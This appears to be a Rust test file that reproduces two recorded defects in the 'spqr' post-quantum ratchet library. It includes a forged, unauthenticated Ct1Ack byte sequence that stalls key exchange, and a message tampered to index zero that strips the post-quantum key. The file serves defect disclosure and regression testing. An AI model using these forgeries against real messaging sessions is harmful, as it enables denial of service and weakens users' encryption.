@@ -1,0 +1,149 @@
+// Reproductions for docs/defects.md items 38 and 39 (forged, unauthenticated control messages).
+// Uses only the public `spqr` API. To run (kept out of the crate per project policy — and note
+// that on case-insensitive filesystems `tests/` aliases the Lean `Tests/` directory, so copy into
+// a scratch checkout rather than this tree):
+//   cp docs/forged_control_message_counterexamples.rs.txt <scratch>/tests/forged_control.rs
+//   cargo test --test forged_control -- --nocapture
+// Verified passing (2 tests) against spqr v1.5.0, debug and release profiles, 2026-09-30.
+
+use rand::TryRngCore;
+use rand_core::OsRng;
+use spqr::{initial_state, recv, send, ChainParams, Direction, Params, Version};
+
+fn pair(min: Version) -> (Vec<u8>, Vec<u8>) {
+    let a = initial_state(Params {
+        version: Version::V1,
+        min_version: min,
+        direction: Direction::A2B,
+        auth_key: &[7u8; 32],
+        chain_params: ChainParams::default(),
+    })
+    .unwrap();
+    let b = initial_state(Params {
+        version: Version::V1,
+        min_version: min,
+        direction: Direction::B2A,
+        auth_key: &[7u8; 32],
+        chain_params: ChainParams::default(),
+    })
+    .unwrap();
+    (a, b)
+}
+
+/// wire: [1, varint(epoch), varint(index), type, ...]
+fn varint(m: &[u8], at: &mut usize) -> u64 {
+    let mut v = 0u64;
+    let mut shift = 0;
+    loop {
+        let b = m[*at];
+        *at += 1;
+        v |= ((b & 0x7f) as u64) << shift;
+        if b & 0x80 == 0 {
+            return v;
+        }
+        shift += 7;
+    }
+}
+fn parse(m: &[u8]) -> (u64, u64, u8) {
+    let mut at = 1;
+    let e = varint(m, &mut at);
+    let i = varint(m, &mut at);
+    (e, i, m[at])
+}
+fn msg_type(m: &[u8]) -> u8 {
+    parse(m).2
+}
+fn msg_epoch(m: &[u8]) -> u64 {
+    parse(m).0
+}
+
+/// Item 38: a 4-byte unauthenticated `Ct1Ack` delivered to B in `EkReceivedCt1Sampled`
+/// makes B stop sending ct1 and commit to ct2; A (still collecting ct1) never completes
+/// epoch 1. Both sides stall.
+#[test]
+fn d38_forged_ct1ack_stalls_epoch() {
+    let mut rng = OsRng.unwrap_err();
+    let (mut a, mut b) = pair(Version::V1);
+
+    // 3 hdr chunks A->B: B reaches HeaderReceived.
+    for _ in 0..3 {
+        let s = send(&a, &mut rng).unwrap();
+        a = s.state;
+        assert_eq!(msg_type(&s.msg), 1); // Hdr
+        b = recv(&b, &s.msg).unwrap().state;
+    }
+    // B sends one ct1 chunk to A: A -> HeaderSent (starts emitting Ek chunks).
+    let s = send(&b, &mut rng).unwrap();
+    b = s.state;
+    assert_eq!(msg_type(&s.msg), 5); // Ct1
+    a = recv(&a, &s.msg).unwrap().state;
+
+    // Deliver 36 Ek chunks A->B while dropping every B->A ct1 chunk.
+    for _ in 0..36 {
+        let s = send(&a, &mut rng).unwrap();
+        a = s.state;
+        assert_eq!(msg_type(&s.msg), 2); // Ek (no ack: A has not finished ct1)
+        b = recv(&b, &s.msg).unwrap().state;
+        let drop = send(&b, &mut rng).unwrap(); // B keeps emitting ct1 chunks; dropped
+        b = drop.state;
+        assert_eq!(msg_type(&drop.msg), 5);
+    }
+    // B now holds the full ek (EkReceivedCt1Sampled) and is still sending ct1.
+
+    // Forge [V1, epoch=1, index=1000 (varint E8 07), Ct1Ack=4]. No MAC anywhere.
+    let forged = vec![1u8, 1, 0xE8, 0x07, 4];
+    let r = recv(&b, &forged).expect("unauthenticated Ct1Ack accepted");
+    b = r.state;
+    assert!(r.key.is_some(), "recv even hands out a DR key for the forged control message");
+
+    // B has switched to Ct2 and will never send ct1 again; A only accepts Ct1 in HeaderSent.
+    let mut saw_epoch2 = false;
+    for _ in 0..200 {
+        let sb = send(&b, &mut rng).unwrap();
+        b = sb.state;
+        assert_eq!(msg_type(&sb.msg), 6, "B emits only Ct2 from now on");
+        a = recv(&a, &sb.msg).unwrap().state;
+        let sa = send(&a, &mut rng).unwrap();
+        a = sa.state;
+        assert_eq!(msg_type(&sa.msg), 2, "A emits only Ek from now on");
+        saw_epoch2 |= msg_epoch(&sa.msg) == 2 || msg_epoch(&sb.msg) == 2;
+        b = recv(&b, &sa.msg).unwrap().state;
+    }
+    assert!(!saw_epoch2, "epoch never advances after the forged ack");
+
+    // Control: same prefix without the forgery completes epoch 1 within the same budget.
+    let (mut a, mut b) = pair(Version::V1);
+    let mut saw_epoch2 = false;
+    for _ in 0..200 {
+        let sa = send(&a, &mut rng).unwrap();
+        a = sa.state;
+        b = recv(&b, &sa.msg).unwrap().state;
+        let sb = send(&b, &mut rng).unwrap();
+        b = sb.state;
+        a = recv(&a, &sb.msg).unwrap().state;
+        saw_epoch2 |= msg_epoch(&sa.msg) >= 2 || msg_epoch(&sb.msg) >= 2;
+    }
+    assert!(saw_epoch2, "honest run advances past epoch 1");
+}
+
+/// Item 39: `index == 0` on an epoch-1 message is a per-message "no PQ key" sentinel that the
+/// receiver honours even when its own `min_version == V1` and a chain exists.
+#[test]
+fn d39_index_zero_yields_no_pq_key_despite_min_version_v1() {
+    let mut rng = OsRng.unwrap_err();
+    let (mut a, b) = pair(Version::V1);
+    let s = send(&a, &mut rng).unwrap();
+    a = s.state;
+    let _ = a;
+    assert!(s.key.is_some(), "honest sender mixed a PQ key");
+    assert_eq!(msg_epoch(&s.msg), 1);
+    assert_eq!(s.msg[2], 1, "index 1");
+
+    let mut tampered = s.msg.clone();
+    tampered[2] = 0; // index := 0
+    let r = recv(&b, &tampered).expect("accepted");
+    assert!(r.key.is_none(), "receiver derives NO PQ key for this message");
+    // and the receiver's chain is untouched: the real message still decrypts afterwards
+    let r2 = recv(&r.state, &s.msg).expect("original still accepted");
+    assert!(r2.key.is_some());
+}
